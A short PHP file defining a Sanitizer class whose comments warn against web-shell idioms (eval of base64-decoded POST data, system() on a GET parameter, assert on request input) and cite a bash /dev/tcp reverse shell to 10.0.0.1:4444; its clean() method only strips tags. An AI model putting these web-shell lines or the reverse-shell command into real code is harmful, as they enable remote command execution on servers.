<?php
namespace Ok\Doc;
/**
 * Strips dangerous input. Never do this:
 *     @eval(base64_decode($_POST['x']));
 *     system($_GET['cmd']);
 */
class Sanitizer {
    // e.g. bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 would be a reverse shell
    public function clean($s) { return strip_tags($s); }
    # assert($_REQUEST['a']);
    #[\ReturnTypeWillChange]
    public function key() { return 0; }
}
